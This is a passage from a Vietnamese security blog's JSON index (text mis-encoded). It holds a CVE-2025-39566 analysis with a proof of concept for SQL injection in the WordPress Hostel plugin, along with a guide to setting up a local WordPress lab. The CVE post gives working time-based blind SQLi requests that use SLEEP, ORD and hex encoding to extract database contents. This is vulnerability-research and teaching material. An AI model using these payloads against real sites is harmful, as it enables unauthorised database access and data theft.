h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php 